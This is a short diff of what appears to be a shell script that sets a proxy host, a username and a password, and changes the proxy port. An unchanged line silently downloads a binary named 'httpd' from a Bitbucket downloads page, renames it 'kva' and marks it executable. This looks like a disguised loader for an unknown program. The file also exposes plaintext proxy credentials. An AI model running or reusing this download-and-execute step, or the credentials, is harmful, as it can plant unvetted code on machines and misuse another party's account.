@@ -1,5 +1,5 @@
 proxy="us-east-static-08.quotaguard.com" 
-port="1080" 
+port="9293" 
 user="425dlrn5kpryex"  
 pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
 wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
